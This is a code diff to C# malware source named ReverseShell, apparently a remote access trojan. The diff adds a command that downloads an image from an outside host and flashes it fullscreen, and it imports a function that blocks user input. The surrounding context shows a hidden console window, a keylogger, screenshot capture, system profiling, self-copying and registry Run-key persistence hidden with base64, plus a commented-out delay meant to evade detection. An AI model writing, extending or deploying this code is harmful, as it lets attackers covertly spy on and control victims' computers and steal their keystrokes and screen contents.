@@ -4,11 +4,14 @@ using System.Drawing;
 using System.Drawing.Imaging; 
 using System.IO;
 using System.Management;
+using System.Net;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms; 
+using System.Media;
+using System.Reflection;
 
 class ReverseShell
 {
@@ -22,6 +25,9 @@ class ReverseShell
     [DllImport("kernel32.dll")]
     static extern IntPtr GetConsoleWindow();
 
+    [DllImport("user32.dll", SetLastError = true)]
+    static extern bool BlockInput(bool fBlockIt);
+
     const int SW_HIDE = 0;
     const int SW_SHOW = 5;
 
@@ -33,6 +39,7 @@ class ReverseShell
             ShowWindow(hWnd, SW_HIDE);
         }
     }
+
     static string GetSystemInfo()
     {
         string info = "[SYSTEM INFO]\n";
@@ -42,6 +49,18 @@ class ReverseShell
         info += $"CPU: {GetHardwareInfo("Win32_Processor", "Name")}\n";
         info += $"RAM: {GetHardwareInfo("Win32_ComputerSystem", "TotalPhysicalMemory")} bytes\n";
         return info;
+    }
+
+    static Image GetImageFromUrl(string url)
+    {
+        using (WebClient client = new WebClient())
+        {
+            byte[] imageData = client.DownloadData(url);
+            using (MemoryStream stream = new MemoryStream(imageData))
+            {
+                return Image.FromStream(stream);
+            }
+        }
     }
 
     static void CaptureScreenshot(StreamWriter writer)
@@ -115,6 +134,30 @@ class ReverseShell
         return "Unknown";
     }
 
+    static void ShowFlash()
+    {
+        string imageUrl = "https://cdn.polarisbot.com/flash.jpg"; 
+
+        Form form = new Form
+        {
+            WindowState = FormWindowState.Maximized,
+            FormBorderStyle = FormBorderStyle.None,
+            TopMost = true
+        };
+
+        PictureBox pictureBox = new PictureBox
+        {
+            Dock = DockStyle.Fill,
+            SizeMode = PictureBoxSizeMode.StretchImage,
+            Image = GetImageFromUrl(imageUrl)
+        };
+
+        form.Controls.Add(pictureBox);
+        form.Show();
+        Task.Delay(10000).Wait();
+        form.Close();
+    }
+
     static void Keylogger(StreamWriter writer)
     {
         StringBuilder logBuffer = new StringBuilder();
@@ -162,12 +205,14 @@ class ReverseShell
         {
             if (!File.Exists(hiddenPath))
             {
-                typeof(File).GetMethod("Copy").Invoke(null, new object[] { exePath, hiddenPath, true });
+                MethodInfo copyMethod = typeof(File).GetMethod("Copy", new Type[] { typeof(string), typeof(string), typeof(bool) });
+                copyMethod.Invoke(null, new object[] { exePath, hiddenPath, true });
             }
 
-            string regPath = Encoding.UTF8.GetString(Convert.FromBase64String("U09GVFdBUkVcTWljcm9zb2Z0XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUnVu"));
+            string regPath = Encoding.UTF8.GetString(Convert.FromBase64String(
+                "U09GVFdBUkVcTWljcm9zb2Z0XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUnVu"));
             Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(regPath, true);
-            
+
             if (key != null)
             {
                 key.SetValue("Client", hiddenPath);
@@ -180,13 +225,12 @@ class ReverseShell
         }
     }
 
-
     [DllImport("user32.dll")]
     static extern short GetAsyncKeyState(int vKey);
 
     static void Main()
     {
-        //Thread.Sleep(20000); if detected then uncomment this line
+        //Thread.Sleep(20000);
         b();
         a();
 
@@ -226,6 +270,11 @@ class ReverseShell
                     if (command.ToLower() == "screenshot")
                     {
                         CaptureScreenshot(writer);
+                    }
+
+                    if (command.ToLower() == "flash")
+                    {
+                        Task.Run(() => ShowFlash());
                     }
 
                     if (command.ToLower() == "info")
